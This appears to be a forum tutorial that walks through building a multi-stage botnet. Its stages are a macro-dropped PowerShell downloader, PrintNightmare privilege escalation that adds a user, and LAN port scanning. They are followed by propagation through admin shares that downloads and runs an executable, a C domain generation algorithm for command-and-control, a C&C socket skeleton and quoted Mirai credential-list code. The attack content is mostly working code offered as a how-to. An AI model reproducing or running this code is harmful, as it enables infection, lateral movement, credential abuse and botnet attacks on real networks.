<p>In Figure 1, The malware operates multi-stage components that inject later stages into separate processes, First exploit a vulnerability for the sake of this article I’m gone deploy an old vulnerability Known as “Print Spooler Vulnerability” or “PrintNightmare”  to infect vulnerable devices and spread the malware within the network, Next deployed our botnet and finally phone C&amp;C to activated and attack is initiated. The main goal is to establishes a connection to a target server, receives instructions, and then launches the DDoS attack using multiple threads.</p>
<p>The multi-stage approach has advantages despite the fact that creating complex, only one-phase could seem to be the best way of achieving our objective. By structuring the stages, I can reduce the impact if one fails or is detected too early. Because of its modular design, the operation stays simple and hidden even if one component is compromised, Given each stage will automatically activate self deletion if succeeds. Moreover, a multi-stage design allows us to modify and enhance the attack plan, creating a balance between complexity and simplicity enables us to obfuscate the command and control channel to make detection more difficult.</p>
<h2><a name="stage-1-the-dropped-powershell-script-2" class="anchor" href="https://0x00sec.org#stage-1-the-dropped-powershell-script-2"></a>Stage 1 - The dropped Powershell script</h2>
<p>During this phase, we assume that the target has fallen for our social engineering tactic and activated the embedded macro within the document. Upon opening the file, the contained code is executed, leading to the deployment of a PowerShell script.</p>
<pre><code class="lang-auto">$urlArray = \"".split(\",\");
$randomNumber = $randomGenerator.next(1, 65536);
$downloadedFile = \"c:\windows\temp\";
foreach($url in $urlArray){
	try{
		$webClient.downloadfile($url.ToString(), $downloadedFile);
		start-process $downloadedFile;
		break;
	}catch{}
}
</code></pre>
<p>The script systematically cycles through a predefined list of domain names, attempting to retrieve the subsequent stage. Specifically, it targets the directory <em>C:\windows\temp/</em>. If the download is successful, the acquired file is executed. Should an error arise, the process continues with the next URL, as the <code>catch</code> clause is left empty. In a real-world scenario, Obfuscation would be taken to an advanced level.</p>
<h2><a name="stage-2-payload-delivery-and-privilege-escalation-3" class="anchor" href="https://0x00sec.org#stage-2-payload-delivery-and-privilege-escalation-3"></a>Stage 2 - Payload Delivery and Privilege Escalation</h2>
<p>When this phase is triggered, the next stage involves checking a set of conditions before proceeding to download the malware, These conditions help ensure controlled execution “I do not want shoot myself”</p>
<p>Next, essential host information is gathered from the system, and a check for administrative privileges is conducted. If the current user lacks such privileges, the script will relaunch with elevated permissions. The ultimate objective is to determine if the current user has administrative access; if not, an attempt to escalate privileges ensues by leveraging the <code>PrintNightmare</code> vulnerability.</p>
<p>in this example.we’re utilizing <code>CVE-2021-34527</code>, known as <code>PrintNightmare</code>, for a Local Privilege Escalation (LPE) scenario using a purely PowerShell-based approach. The provided PowerShell script executes the PrintNightmare attack technique, aiming to elevate local privileges on the system.</p>
<p>This function is designed to automate the exploitation of the <code>CVE-2021-34527</code>, commercing by loading and executing a PowerShell script containing the exploit code you can find on <a href="https://github.com/JohnHammond/CVE-2021-34527/blob/master/CVE-2021-34527.ps1" rel="noopener nofollow ugc">github</a>, and it checks for successful privilege escalation</p>
<p>In simple term’s the (poc)exploit objective is to escalate privileges by leveraging the PrintNightmare vulnerability. It first generates a payload DLL, constructs custom structures, and then attempts to load the payload as a printer driver.</p>
<p>Let’s break down some key functionalities (PoC):</p>
<p>The heart of the exploit is encapsulated within the <code>Invoke-Nightmare</code> function. This function is responsible for creating and executing the exploit payload.</p>
<p><strong>2. Parameters:</strong></p>
<p>The <code>Invoke-Nightmare</code> function accepts the following parameters:</p>
<ul>
<li><code>$DriverName</code>: A string parameter, which may be set to a benign name.</li>
<li><code>$NewUser</code>: A string parameter, representing the new username for privilege escalation.</li>
<li><code>$NewPassword</code>: A string parameter, representing the new password for privilege escalation.</li>
<li><code>$DLL</code>: A string parameter, which can be used to provide a custom payload DLL (Dynamic Link Library) or left empty to generate a payload.</li>
</ul>
<p><strong>3. DLL Generation and Customization:</strong></p>
<ul>
<li>If <code>$DLL</code> is not provided (empty), the PoC generates a malicious DLL payload by:
<ul>
<li>Obtaining the payload data as a base64-encoded string using the <code>get_nightmare_dll</code> function.</li>
<li>Converting the base64 string to byte data.</li>
<li>Encoding the new username and password into the payload, if provided.</li>
<li>Saving the payload as a temporary DLL file (<code>nightmare.dll</code>) in the system’s temporary directory.</li>
</ul>
</li>
</ul>
<p>We store the payload as a string. It decodes a base64-encoded string into a PowerShell script, presumably containing the code to exploit CVE-2021-34527 (PrintNightmare).</p>
<p><strong>Checking for Admin Privileges:</strong><br>
The function begins by checking if the current user has administrator privileges using a custom function or cmdlet called <code>Test-Admin</code>. If the user already has admin privileges, the exploit is not executed, as there is no need for further escalation.</p>
<pre><code class="lang-auto">function PrivEsc {
    if (-not (Test-Admin)) {
        $NightmareCVE = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PrintNightmare))
        $d_path = "c:/users/$env:USERNAME/appdata/local/temp/$(Get-RandomString (Get-Random -Minimum 5 -Maximum 12))"
        Set-Content -Path "$d_path.ps1" -Value $NightmareCVE
        $try_nightmare = Invoke-Expression -Command "Import-Module $d_path.ps1; Invoke-Nightmare -NewUser '$env:USERNAME' -NewPassword '0xph001234!!'"
        if (Test-Admin) {
            Write-Host "got admin!"
            return $true
        }
        $check_imp = Invoke-Expression -Command 'whoami /priv' | ForEach-Object { $_.ToLower() }
        foreach ($line in $check_imp) {
            if ($line -match 'seimpersonateprivilege' -and $line -match 'enabled') {
            }
        }
    }
    return $false
}
</code></pre>
<p><strong>Executing the Exploit:</strong><br>
Next, Creates a new PowerShell script file in the random directory path (<code>"$d_path.ps1"</code>) and writes the decoded exploit code (<code>$NightmareCVE</code>) into the file,  attempts to execute the PowerShell script using <code>Invoke-Expression</code>. It imports the module (<code>Import-Module $d_path.ps1</code>) and passes parameters to the <code>Invoke-Nightmare</code> function, including a new username and password. (<code>$env:USERNAME</code>) and a new password (<code>'0xph001234!!'</code>).</p>
<p>After executing the exploit, the script checks again for admin privileges using <code>Test-Admin</code>. If the user now has admin privileges, it writes “got admin!” to the console and returns <code>true</code>, indicating a successful privilege escalation, and finally we execute <code>whoami /priv</code> to check for a successful <strong>Exploitation</strong>  or if the malware is unable to, or if they already have admin privileges before running the code.</p>
<h2><a name="stage-3-network-enumeration-and-propagation-4" class="anchor" href="https://0x00sec.org#stage-3-network-enumeration-and-propagation-4"></a>Stage 3 - Network Enumeration and Propagation</h2>
<p>In this phase, we conduct network enumeration, identify vulnerable ports, and exploit open ports for potential propagation. This phase involves:</p>
<p>pivotal in identifying local network addresses, particularly those associated with common private IP ranges. By excluding the ‘lo’ interface, which pertains to the local loopback, this function establishes a basis for subsequent actions involving local network enumeration.</p>
<p>Fundamentally, This process of pinpointing these local addresses is what furnishes us with the indispensable intelligence we require.</p>
<pre><code class="lang-auto">function Get-LAN {
    $interfaces = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
    $localIP = @()

    foreach ($interface in $interfaces) {
        if ($interface.Name -eq 'lo') {
            continue
        }
        
        $iface = $interface.GetIPProperties().UnicastAddresses | Where-Object { $_.Address.AddressFamily -eq 'InterNetwork' }
        if ($iface -ne $null) {
            foreach ($j in $iface) {
                $addr = $j.Address.IPAddressToString
                if ($addr -match '^192\.168|^172\.16') {
                    $localIP += $addr
                }
            }
        }
    }
    return $localIP
}

</code></pre>
<ol>
<li>
<p>Utilizing the <code>System.Net.NetworkInformation.NetworkInterface</code> class, it retrieves a list of network interfaces present on the local system.</p>
</li>
<li>
<p>It filters out the ‘lo’ interface (loopback), which is typically used for local testing and doesn’t provide relevant network information.</p>
</li>
<li>
<p>For each network interface, it extracts the IPv4 addresses that belong to common private IP ranges (e.g., 192.168.x.x, 172.16.x.x).</p>
</li>
<li>
<p>These identified local IP addresses are collected and stored in the <code>$localIP</code> array, which forms the foundation for subsequent actions related to local network enumeration.</p>
</li>
</ol>
<p>Next,  our objective to pinpoint vulnerable ports within the local network. first leverages the IP addresses obtained from the <code>Get-LAN</code> function and iterates through a list of ports that are commonly exploited by attackers.</p>
<pre><code class="lang-auto">function Get-VulnPorts {
    $vulnPorts = @('445', '3389', '5985')
    $vuln = @{}
    $localIP = Get-LAN

    foreach ($addr in $localIP) {
        $ipParts = $addr -split '\.'
        $range = [ipaddress]::Parse("$($ipParts[0]).$($ipParts[1]).1.0/24")

        foreach ($ip in $range.AddressList) {
            foreach ($port in $vulnPorts) {
                $client = New-Object System.Net.Sockets.TcpClient
                $result = $client.BeginConnect($ip, $port, $null, $null)
                $wait = $result.AsyncWaitHandle.WaitOne(100, $false)
                if ($wait -and !$client.Connected) {
                    if ($vuln.ContainsKey($ip.ToString())) {
                        $vuln[$ip.ToString()] += ",$port"
                    } else {
                        $vuln[$ip.ToString()] = $port
                    }
                }
                $client.Close()
            }
        }
    }
    return $vuln
}
</code></pre>
<p>For each IP address and port combination, the function tests the ability to establish a connection. Failed connections prompt recording of the IP and port in the <code>$vuln</code> hash table, indicating potential security weaknesses.</p>
<ol>
<li>
<p>It maintains a predefined list of commonly exploited vulnerable ports, including 445 (SMB), 3389 (RDP), and 5985 (WinRM).</p>
</li>
<li>
<p>For each local IP address, the function iterates through the list of vulnerable ports and attempts to establish a connection using <code>System.Net.Sockets.TcpClient</code>.</p>
</li>
<li>
<p>If a connection attempt fails (indicating an open port), the function records both the IP address and the port number in the <code>$vuln</code> hash table. This hash table provides a comprehensive list of potential security weaknesses within the local network.</p>
</li>
</ol>
<p>This one is self explanatory we builds on insights from the <code>Get-VulnPorts</code> function.and focuses on exploiting open ports. Specifically, if a vulnerable port corresponds to SMB (port 445).</p>
<pre><code class="lang-auto">function Abuse-OpenPorts {
    $smb = '445'
    $mstsc = '3389'
    $ports = Get-VulnPorts

    foreach ($ip in $ports.Keys) {
        $openPorts = $ports[$ip] -split ','

        foreach ($port in $openPorts) {
            if ($port -eq $smb) {
                Drop-OnShare $ip
            } elseif ($port -eq $mstsc) {
                MSTSC-Nightmare $ip
            }
        }
    }
}
</code></pre>
<ol>
<li>
<p>Checking whether the vulnerable ports identified in the previous step correspond to specific services, such as SMB (port 445) or RDP (port 3389).</p>
</li>
<li>
<p>Depending on the service associated with an open port, the function invokes corresponding functions, such as <code>Drop-OnShare</code> or <code>MSTSC-Nightmare</code>, to escalate the potential vulnerability.</p>
</li>
<li>
<p>For open ports that match SMB (port 445), the <code>Drop-OnShare</code> function is called to exploit shared network resources on remote systems.</p>
</li>
<li>
<p>For open ports corresponding to RDP (port 3389), the function invokes the <code>MSTSC-Nightmare</code> function to further exploit the potential vulnerability.</p>
</li>
</ol>
<p>If pass the function invokes <code>Drop-OnShare</code> to execute actions targeting shared resources. Similarly, if the vulnerable port matches RDP (port 3389), <code>MSTSC-Nightmare</code> is invoked to further exploit the situation.</p>
<p>and finally leveraging information gathered to exploit shared network resources on remote systems. Its core functionalities include payload delivery and lateral movement:</p>
<pre><code class="lang-auto">function Drop-OnShare($ip) {
    $payload = @"
    (New-Object Net.WebClient).DownloadFile('', 'C:\phoo.exe')
    Start-Process 'C:\'
"@
    
    $defaultShares = @('C$', 'D$', 'ADMIN$')
    $availableDrive = Get-PSDrive -Name 'Z' -ErrorAction SilentlyContinue

    if ($availableDrive -eq $null) {
        $availableDrive = Get-PSDrive -Name ('A'..'Z' | Where-Object { Test-Path $_: -PathType Container } | Select-Object -First 1)
    }

    foreach ($share in $defaultShares) {
        try {
            $sharePath = "\\$ip\$share"
            if (Test-Path -Path $sharePath) {
                $null = Invoke-Expression -Command "net use $($availableDrive.Name): $sharePath /user:username password 2&gt;&amp;1"
                if (Test-Path -Path "$($availableDrive.Name):") {
                    $payloadPath = "$($availableDrive.Name):\aaaa.ps1"
                    $payload | Set-Content -Path $payloadPath
                    $null = Invoke-Expression -Command "powershell -ExecutionPolicy Bypass -File $payloadPath"
                    Remove-Item -Path $payloadPath
                    $null = Invoke-Expression -Command "net use $($availableDrive.Name): /delete /yes"
                }
            }
        }
        catch {}
    }
}
</code></pre>
<p>The primary purpose of the <code>Drop-OnShare($ip)</code> function is to utilize the inherent vulnerabilities of shared network resources to distribute and execute malicious payloads on remote systems. By taking advantage of administrative shares, the function aims to achieve the following goals:</p>
<ol>
<li>
<p><strong>Payload Delivery:</strong> The function utilizes an embedded PowerShell payload within the script to download a malware file (<code>phoo.exe</code>) and initiate its execution on the target system.</p>
</li>
<li>
<p><strong>Lateral Movement:</strong> By taking advantage of administrative shares (<code>C$</code>, <code>D$</code>, <code>ADMIN$</code>), the function facilitates lateral movement within the network. It maps these shares to drive letters.</p>
</li>
</ol>
<p>For each default administrative share (<code>C$</code>, <code>D$</code>, <code>ADMIN$</code>), it attempts to map the share to the available drive using the <code>net use</code> command with supplied credentials (username and password), If the share mapping is successful, the payload is written to a file on the remote system, executed, and then removed.</p>
<h2><a name="stage-4-the-binary-5" class="anchor" href="https://0x00sec.org#stage-4-the-binary-5"></a>Stage 4 – The binary</h2>
<p>Once the conditions are met and the execution proceeds as planned, the user’s device becomes part of our botnet. The next step involves our bot binary identifying and connecting to a Command and Control (C&amp;C) server for exchanging messages. This connection may be established using either a hardcoded IP address or domain name.</p>
<p>Next, We develop an algorithm that generates predictable domain names associated with the C&amp;C server. This algorithm’s specifics are known only to the C&amp;C server operators, making it difficult to extract or block communication based on domain names.</p>
<h3><a name="domain-generation-algorithms-dgas-6" class="anchor" href="https://0x00sec.org#domain-generation-algorithms-dgas-6"></a>Domain Generation Algorithms (DGAs):</h3>
<p>For this part the DGA used generated domain names based on various parameters, including the current date and time.</p>
<h4><a name="features-7" class="anchor" href="https://0x00sec.org#features-7"></a>Features</h4>
<ol>
<li>
<p>Daily Domain Generation: The DGA can generate up to 50 different domain names per day. This high degree of variability ensures that the C&amp;C server can rapidly adapt to changing circumstances, making it challenging for security analysts to predict and block communication.</p>
</li>
<li>
<p>Multiple Domain Testing: To further confound detection efforts, the malware will test up to 20 different domains in succession. Each domain is tested only once, reducing the risk of patterns emerging in communication behavior.</p>
</li>
<li>
<p>Delay Mechanism: There is a built-in 5s wait time between attempts to connect to new domains. This delay helps the botnet avoid triggering suspicion by flooding network traffic with connection attempts.</p>
</li>
</ol>
<p>The domain generation routine first generates a seed which depends on the sequence number and system time. The seed is built using cryptographic hashes. The hashing algorithm is SHA256, The seed is generated as follows:</p>
<pre><code class="lang-auto">    // Update SHA-256 hash with sequence number
    SHA256_CTX sha256_context;
    SHA256_Init(&amp;sha256_context);
    SHA256_Update(&amp;sha256_context, &amp;seq_nr, sizeof(seq_nr));

    // Update SHA-256 hash with year, month, and day
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_year, sizeof(date-&gt;tm_year));
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mon, sizeof(date-&gt;tm_mon));
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mday, sizeof(date-&gt;tm_mday));

    // Finalize the SHA-256 hash
    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256_Final(sha256_result, &amp;sha256_context);

    // Convert SHA-256 hash to hex string
    for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) {
        snprintf(domain_parts + i * 2, 3, "%02x", sha256_result[i]);
    }

</code></pre>
<p>The core function generates a complete domain name:</p>
<ul>
<li>It selects a random suffix from a predefined list.</li>
<li>Calculates the SHA-256 hash,  year, month, and day.</li>
<li>Converts the SHA-256 hash to a hexadecimal string.</li>
<li>Generates additional domain parts based on the hex values from the hash.</li>
<li>Appends the selected suffix to complete the domain name.</li>
</ul>
<p>Entry point:</p>
<ul>
<li>Seeds the random number generator with the current time.</li>
<li>Enters a loop to generate 50 domain names, each unique due to the random sequence number and date.</li>
<li>For each iteration, it generates a random sequence number, retrieves the current date, calls create_domain to generate a domain name, and tested it. It then waits for 5 seconds before the next iteration.</li>
</ul>
<h4><a name="top-level-domain-8" class="anchor" href="https://0x00sec.org#top-level-domain-8"></a>Top Level Domain :</h4>
<p>The code defines an array called suffixes that contains a list of possible top-level domain (TLD) suffixes. These suffixes represent the highest level of the domain hierarchy (e.g., “.xyz,” “.cool,” “.ninja”).</p>
<pre><code class="lang-auto">
const char *suffixes[] = {".xyz", ".cool", ".ninja"};
</code></pre>
<p>To create domain names with different TLDs, the code randomly selects one of the suffixes from the suffixes array. This random selection introduces variability into the generated domain names.</p>
<pre><code class="lang-auto">int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));
</code></pre>
<p>After generating the domain name parts (based on the sequence number, date-based elements, the selected suffix is appended to the domain name.</p>
<pre><code class="lang-auto">strcat(domain_parts, suffixes[suffix_index]);
</code></pre>
<p>Suppose suffixes contains three TLD suffixes: “.xyz,” “.cool,” and “.ninja.”</p>
<p>During the execution of the create_domain function, a random number between 0 and 2 is generated to select one of these suffixes.</p>
<p>For instance, if suffix_index is 1 (indicating “.cool”), the generated domain name will include “.cool” as the top-level domain. The rest of the domain name is constructed based on the sequence number, date, and additional parts.</p>
<h4><a name="c-code-of-the-dga-9" class="anchor" href="https://0x00sec.org#c-code-of-the-dga-9"></a>C Code of the DGA</h4>
<pre><code class="lang-auto">
// Function to generate a cryptographically secure random number
uint32_t generate_random_sequence() {
    uint32_t seq_nr;
    if (RAND_bytes((unsigned char *)&amp;seq_nr, sizeof(seq_nr)) != 1) {
        // Handle random number generation failure
        fprintf(stderr, "Error generating random sequence number.\n");
        exit(1);
    }
    return seq_nr;
}

// Function to convert a hex string to an integer
uint32_t hex_to_int(const char *hex) {
    uint32_t result = 0;
    for (int i = 0; hex[i] != '\0'; i++) {
        result &lt;&lt;= 4;
        if (hex[i] &gt;= '0' &amp;&amp; hex[i] &lt;= '9') {
            result += hex[i] - '0';
        } else if (hex[i] &gt;= 'a' &amp;&amp; hex[i] &lt;= 'f') {
            result += hex[i] - 'a' + 10;
        }
    }
    return result;
}

// Function to generate a domain part
void generate_domain_part(uint32_t seed, int nr, char *part) {
    int i = 0;
    while (nr &gt; 1) {
        uint32_t edx = seed % 36;
        seed /= 36;
        char char_value;
        if (edx &gt; 9) {
            char_value = 'a' + (char)(edx - 10);
        } else {
            char_value = '0' + (char)edx;
        }
        part[i++] = char_value;
        if (seed == 0) {
            break;
        }
        nr--;
    }
    part[i] = '\0';
    // Reverse the part in place
    int len = strlen(part);
    for (int j = 0; j &lt; len / 2; j++) {
        char temp = part[j];
        part[j] = part[len - j - 1];
        part[len - j - 1] = temp;
    }
}
</code></pre>
<p>In summary, the code constructs domain names by combining multiple elements, including a random TLD suffix, a SHA-256 hash of the sequence number and date, and additional domain parts generated from the hash. This approach aims to create unique and unpredictable domain names.</p>
<pre><code class="lang-auto">// Function to create a domain
void create_domain(uint32_t seq_nr, struct tm *date, char *domain) {
    // Define an array of possible suffixes
    const char *suffixes[] = {".xyz", ".cool", ".ninja"};

    // Calculate a random index to select a suffix
    int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));

    // Calculate the total length of domain_parts
    size_t total_length = SHA256_DIGEST_LENGTH * 2 + strlen(suffixes[suffix_index]) + 1;

    // Dynamically allocate memory for domain_parts
    char *domain_parts = (char *)malloc(total_length);

    // Ensure successful allocation
    if (domain_parts == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        exit(1);
    }

    // Initialize domain_parts as an empty string
    domain_parts[0] = '\0';

    // Update SHA-256 hash with sequence number
    SHA256_CTX sha256_context;
    SHA256_Init(&amp;sha256_context);
    SHA256_Update(&amp;sha256_context, &amp;seq_nr, sizeof(seq_nr));

    // Update SHA-256 hash with year
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_year, sizeof(date-&gt;tm_year));

    // Update SHA-256 hash with month
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mon, sizeof(date-&gt;tm_mon));

    // Update SHA-256 hash with day
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mday, sizeof(date-&gt;tm_mday));

    // Finalize the SHA-256 hash
    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256_Final(sha256_result, &amp;sha256_context);

    // Convert SHA-256 hash to hex string
    for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) {
        snprintf(domain_parts + i * 2, 3, "%02x", sha256_result[i]);
    }

    // Generate domain parts
    for (int i = SHA256_DIGEST_LENGTH * 2; i &lt; total_length - strlen(suffixes[suffix_index]); i += 8) {
        uint32_t seed = hex_to_int(domain_parts + i);
        char part[9];
        generate_domain_part(seed, 8, part);
        strcat(domain_parts, part);
    }

    // Append the selected suffix to the domain_parts
    strcat(domain_parts, suffixes[suffix_index]);

    // Copy the generated domain to the output parameter
    strcpy(domain, domain_parts);

    // Free the dynamically allocated memory
    free(domain_parts);
}

int main() {
    // Seed the random number generator
    srand(time(NULL));

    for (int i = 0; i &lt; 50; i++) {
        uint32_t seq_nr = generate_random_sequence();  // Generate a random sequence number
        time_t rawtime;
        struct tm *date;

        time(&amp;rawtime);
        date = localtime(&amp;rawtime);

        char domain[160]; // Increased buffer size to accommodate the longer SHA-256 hash
        create_domain(seq_nr, date, domain);

        //  !!! (replace this )
        // Code here !!! 

        printf("Testing domain: %s\n", domain);

        // Wait for 5 seconds
        sleep(5);
    }

    return 0;
}
</code></pre>
<ul>
<li>
<p>Domain Resolution:</p>
<p>When a bot needs to establish communication with the C&amp;C server, it calculates the current domain name using the DGA algorithm.<br>
The algorithm generates a domain name that the bot will attempt to resolve into an IP address.</p>
</li>
<li>
<p>C&amp;C Server Setup:</p>
<p>The botnet configure a large number of domain names corresponding to possible future C&amp;C servers, These domain names are registered in advance.</p>
</li>
<li>
<p>Dynamic Resolution Attempt:</p>
<p>When the bot attempts to connect to the C&amp;C server, it tries to resolve the generated domain name into an IP address.<br>
The domain name may not exist initially, but at some point in the future, the author will register one of the pre-generated domain names, associating it with the IP address of the actual C&amp;C server.</p>
</li>
</ul>
<h2><a name="final-stage-phone-home-10" class="anchor" href="https://0x00sec.org#final-stage-phone-home-10"></a>Final Stage  - Phone Home</h2>
<p>Generating domain names is just one aspect of communication with a C&amp;C server. To establish communication with a C&amp;C server, typically needs additional functionality, such as:</p>
<ul>
<li>
<p>Network Communication: The code needs to communicate over the network, typically using protocols like HTTP, HTTPS, or custom protocols. This would involve creating sockets, sending requests to the C&amp;C server, and receiving responses, Next, Command Parsing and Data Encryption/Decryption C&amp;C communications are encrypted to hide the actual content from network monitoring, Persistence and finally, Data Exfiltration.</p>
</li>
<li>
<p>Our botnet should:</p>
<p>Include a master node that controls all other nodes on the network, Deploy disguised malware/slave nodes on host computers transmit commands from the master node to the slave node, execute, and return an output back to us</p>
</li>
</ul>
<ol>
<li><strong>Initiation:</strong></li>
</ol>
<pre><code class="lang-auto">int channel = //initiate a channel given SERVER, PORT, and name;
</code></pre>
<p>Next, Let’s define the actual connection between master and slave! To do this, define a network socket through which data can be sent. Think of master as having many ‘electrical sockets’. Now, we need to build a ‘plug’ on slave that fits master’s ‘wall sockets’. We can do this using the socket library’s <code>socket()</code> function. How convenient! <code>socket()</code> takes in 3 arguements: communications domain, socket type, and a protocol. For communication’s domain, you probably already guessed it: <code>AF_INET.</code> For socket type, we want our socket to be one that simply streams data both directions. Hence, use the given macro <code>SOCK_STREAM</code> Let’s not worry about the socket protocol.</p>
<pre><code class="lang-auto">int init_channel (char *ip, int port, char *name) {
	char msg[CMD_LENGTH];
	struct sockaddr_in server;

	server.sin_addr.s_addr = //convert the ip to network byte order
	server.sin_family = //set the server's communications domain
  server.sin_port = //convert port to network byte order
  
  int channel = //define a SOCK_STREAM socket
  
  if(channel &lt; 0) {
    perror ("socket:");
    exit(1);
  }
  
  int connection_status = //use the defined channel to connect the slave to the master server
  
  if (connection_status &lt; 0) {
    perror ("connect:");
    exit(1);
  }

  respond (channel, msg);
  return channel;
}
</code></pre>
<p>This is a fairly fundamental network. The function returns an int representing the socket. Store this value in channel. Next, we want to jump start our socket (plugging slave into master’s wall <code>socket()</code>. Call the C function <code>connect()</code>. This takes in three arguments: the channel, the <code>sockaddr struct</code>, and the size of the struct in bytes. If connect() returns a positive integer, your connection with master was successful! In order to test our newfound connection, let’s send a greeting to master! Populate our message buffer and use <code>respond()</code> to send msg through channel back to master. Finally, we want the <code>init_channel()</code> function to return this successful connection.</p>
<ol start="2">
<li><strong>Listening for messages:</strong></li>
</ol>
<p>Once the slave is connected to the master, it needs to constantly be listening for messages and act immediately upon a command. So, let’s use an infinite while loop to receive and parse these messages, below the <code>printf</code> statement, add an infinite while loop that calls two functions: <code>recieve()</code> and <code>parse()</code> in that order. Both functions take the channel and msg stack buffer as arguments. This should look something like:</p>
<pre><code class="lang-auto">Infinite Loop {
  recieve(...);
  parse(...);
}
</code></pre>
<p>Also It’s important to note that having a large number of bots attempting to connect to a single C&amp;C server simultaneously can inadvertently launch a Distributed Denial of Service (DDoS) attack against the server. To address this, we adopt a hierarchical structure where groups of bots, typically in batches of a fixed number like 50, report to intermediary nodes. These nodes can be part of the botnet and may further relay requests and responses to other nodes before reaching the main C&amp;C server. This division of labor helps distribute the load and reduces the risk of DDoS attacks on the primary C&amp;C server.</p>
<h1><a name="final-notes-and-analysis-11" class="anchor" href="https://0x00sec.org#final-notes-and-analysis-11"></a>Final Notes and  Analysis</h1>
<p>Our botnet is still pretty uninteresting; I avoided the most interesting part for obvious reasons: this is not true malware; it only has to teach you the basics. A botnet is an interesting piece of code and requires a skilled coder, not necessarily an experienced one. Understanding networking protocols, including TCP/IP, DNS, and HTTP, Also, some exploit development is initiated through the exploitation of vulnerabilities. Setting up and maintaining C&amp;C servers to issue commands to botnet nodes is one of the most important things to consider because it has many aspects. One of them is maintaining the OpSec of the botnet infrastructure and its operators. Implementing encryption and cryptographic techniques Planning for infections, spreading, and having a killswitch if things go sideways, which they always do,</p>
<p>Let’s take, for example, the Mirai malware, for which I explained a code snippet of the leaked source code in the original post. Mirai is one of the successfully operated With over a quarter billion CCTV cameras around the world alone, as well as the continued growth of other IoT devices infected. So let’s revisit some of the functionalities. The malware performs wide-ranging scans of IP addresses to locate under-secured IoT devices that could be remotely accessed via easily guessable login credentials.</p>
<aside class="onebox githubblob" data-onebox-src="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123">
  <header class="source">

      <a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123" target="_blank" rel="noopener nofollow ugc">soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123</a></h4>



    <pre class="onebox"><code class="lang-c">
      <ol class="start lines" start="113" style="counter-reset: li-counter 112 ;">
          <li>iph-&gt;ttl = 64;</li>
          <li>iph-&gt;protocol = IPPROTO_TCP;</li>
          <li></li>
          <li>// Set up TCP header</li>
          <li>tcph-&gt;dest = htons(23);</li>
          <li>tcph-&gt;source = source_port;</li>
          <li>tcph-&gt;doff = 5;</li>
          <li>tcph-&gt;window = rand_next() &amp; 0xffff;</li>
          <li>tcph-&gt;syn = TRUE;</li>
          <li></li>
          <li class="selected">// Set up passwords</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin</li>
          <li>add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321</li>
      </ol>
    </code></pre>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>One of Mirai’s key features is its ability to launch HTTP floods and various network-layer (OSI layer 3-4) DDoS attacks. It can execute GRE IP and GRE ETH floods, SYN and ACK floods, STOMP floods, DNS floods, and UDP flood attacks.</p>
<p>Interestingly, Mirai includes a hardcoded list of IPs that its bots are programmed to avoid during scans. This list, which you can find below, includes the US Postal Service, the Department of Defense, the Internet Assigned Numbers Authority (IANA) and IP ranges belonging to Hewlett-Packard and General Electric.</p>
<aside class="onebox githubblob" data-onebox-src="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674">
  <header class="source">

      <a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674" target="_blank" rel="noopener nofollow ugc">soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674</a></h4>



    <pre class="onebox"><code class="lang-c">
      <ol class="start lines" start="664" style="counter-reset: li-counter 663 ;">
          <li></li>
          <li>    addr.sin_family = AF_INET;</li>
          <li>    addr.sin_addr.s_addr = conn-&gt;dst_addr;</li>
          <li>    addr.sin_port = conn-&gt;dst_port;</li>
          <li></li>
          <li>    conn-&gt;last_recv = fake_time;</li>
          <li>    conn-&gt;state = SC_CONNECTING;</li>
